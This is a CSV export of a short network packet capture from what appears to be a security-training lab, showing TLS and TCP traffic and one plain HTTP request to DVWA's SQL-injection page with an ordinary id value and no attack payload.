"No.","Time","Source","Destination","Protocol","Length","Info"
"1","0.000000000","10.0.2.5","34.149.100.209","TLSv1.2","100","Application Data"
"2","0.000220897","10.0.2.5","34.149.100.209","TLSv1.2","85","Encrypted Alert"
"3","0.000331259","34.149.100.209","10.0.2.5","TCP","60","443  >  34862 [ACK] Seq=1 Ack=79 Win=32172 Len=0"
"4","0.015726838","34.149.100.209","10.0.2.5","TCP","60","443  >  34862 [FIN, ACK] Seq=1 Ack=79 Win=32172 Len=0"
"5","0.015737053","10.0.2.5","34.149.100.209","TCP","54","34862  >  443 [ACK] Seq=79 Ack=2 Win=60532 Len=0"
"6","1.000711691","10.0.2.5","34.160.144.191","TLSv1.2","100","Application Data"
"7","1.001170227","10.0.2.5","34.160.144.191","TLSv1.2","85","Encrypted Alert"
"8","1.001745477","34.160.144.191","10.0.2.5","TCP","60","443  >  56406 [ACK] Seq=1 Ack=79 Win=31471 Len=0"
"9","1.015298503","34.160.144.191","10.0.2.5","TCP","60","443  >  56406 [FIN, ACK] Seq=1 Ack=79 Win=31471 Len=0"
"10","1.015309556","10.0.2.5","34.160.144.191","TCP","54","56406  >  443 [ACK] Seq=79 Ack=2 Win=30660 Len=0"
"11","8.617549052","10.0.2.4","10.0.2.5","TCP","66","80  >  41664 [FIN, ACK] Seq=1 Ack=1 Win=54 Len=0 TSval=26760 TSecr=3495261933"
"12","8.659116307","10.0.2.5","10.0.2.4","TCP","66","41664  >  80 [ACK] Seq=1 Ack=2 Win=249 Len=0 TSval=3495276971 TSecr=26760"
"13","22.517165153","10.0.2.5","10.0.2.4","TCP","74","51860  >  80 [SYN] Seq=0 Win=32120 Len=0 MSS=1460 SACK_PERM=1 TSval=3495290829 TSecr=0 WS=128"
"14","22.517667991","10.0.2.4","10.0.2.5","TCP","74","80  >  51860 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460 SACK_PERM=1 TSval=28149 TSecr=3495290829 WS=128"
"15","22.517707775","10.0.2.5","10.0.2.4","TCP","66","51860  >  80 [ACK] Seq=1 Ack=1 Win=32128 Len=0 TSval=3495290829 TSecr=28149"
"16","22.517832822","10.0.2.5","10.0.2.4","HTTP","566","GET /dvwa/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1 "
"17","22.518094454","10.0.2.4","10.0.2.5","TCP","66","80  >  51860 [ACK] Seq=1 Ack=501 Win=6912 Len=0 TSval=28149 TSecr=3495290830"
